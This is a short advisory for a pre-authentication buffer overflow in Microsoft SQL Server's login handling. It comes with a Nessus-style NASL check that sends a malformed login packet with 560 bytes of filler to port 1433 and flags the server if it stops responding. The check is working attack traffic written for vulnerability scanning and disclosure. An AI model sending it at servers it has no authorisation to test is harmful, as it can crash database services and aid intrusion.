source: http://www.securityfocus.com/bid/5411/info

A vulnerability has been discovered in Microsoft SQL Server that could make it possible for remote attackers to gain access to target hosts.

It is possible for an attacker to cause a buffer overflow condition on the vulnerable SQL server with a malformed login request. This may allow a remote attacker to execute arbitrary code as the SQL Server process.

This vulnerability reportedly occurs even before authentication can proceed.

##
#
# this script tests for the "You had me at hello" overflow
# in MSSQL (tcp/1433)
# Copyright Dave Aitel (2002)
# Bug found by: Dave Aitel (2002)
#
##
#TODO:
#techically we should also go to the UDP 1434 resolver service
#and get any additional ports!!!


if(description)
{
 script_id(11067);
# script_cve_id("CVE-2000-0402");
 script_version ("$Revision: 0.1 $");
 name["english"] = "Microsoft SQL Server Hello Overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote MS SQL server is vulnerable to the Hello overflow.

An attacker may use this flaw to execute commands against
the remote host as LOCAL/SYSTEM, 
as well as read your database content. 

Solution : disable this service (Microsoft SQL Server).

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Microsoft SQL Server Hello Overflow";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Dave Aitel");
 family["english"] = "Windows";
 script_family(english:family["english"]);
 script_require_ports(1433); 
 exit(0);
}

#
# The script code starts here
#
#taken from mssql.spk
pkt_hdr = raw_string(
0x12 ,0x01 ,0x00 ,0x34 ,0x00 ,0x00 ,0x00 ,0x00  ,0x00 ,0x00 ,0x15 ,0x00 ,0x06 ,0x01 ,0x00 ,0x1b
,0x00 ,0x01 ,0x02 ,0x00 ,0x1c ,0x00 ,0x0c ,0x03  ,0x00 ,0x28 ,0x00 ,0x04 ,0xff ,0x08 ,0x00 ,0x02
,0x10 ,0x00 ,0x00 ,0x00
);

#taken from mssql.spk
pkt_tail = raw_string (
0x00 ,0x24 ,0x01 ,0x00 ,0x00
);

#techically we should also go to the UDP 1434 resolver service
#and get any additional ports!!!
port = 1433;
found = 0;
report = "The SQL Server is vulnerable to the Hello overflow.

An attacker may use this flaw to execute commands against
the remote host as LOCAL/SYSTEM,
as well as read your database content.

Solution : disable this service (Microsoft SQL Server).

Risk factor : High";


if(get_port_state(port))
{
    soc = open_sock_tcp(port);

    if(soc)
    {
    	#uncomment this to see what normally happens
        #attack_string="MSSQLServer";
	#uncomment next line to actually test for overflow
	attack_string=crap(560);
        # this creates a variable called sql_packet
	sql_packet = pkt_hdr+attack_string+pkt_tail;
	send(socket:soc, data:sql_packet);

	    r  = recv(socket:soc, length:4096);
	    close(soc);
	display ("Result:",r,"\n");
	   if(!r)
	    {
	     display("Security Hole in MSSQL\n");
            security_hole(port:port, data:report);
	    }
    }
}